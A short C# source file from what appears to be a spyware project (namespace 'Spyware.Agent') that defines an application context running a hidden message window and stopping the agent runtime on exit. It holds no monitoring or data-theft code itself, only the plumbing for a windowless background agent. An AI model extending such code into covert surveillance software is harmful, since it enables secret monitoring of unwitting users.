using System.Windows.Forms;

namespace Spyware.Agent;

internal sealed class AgentApplicationContext : ApplicationContext
{
    private readonly AgentRuntime _runtime;
    private bool _exiting;

    public AgentApplicationContext(AgentRuntime runtime)
    {
        _runtime = runtime;
        MainForm = new HiddenMessageWindow();
    }

    protected override void ExitThreadCore()
    {
        if (_exiting) return;

        _exiting = true;
        _runtime.Stop("salida de la aplicación");
        base.ExitThreadCore();
    }
}
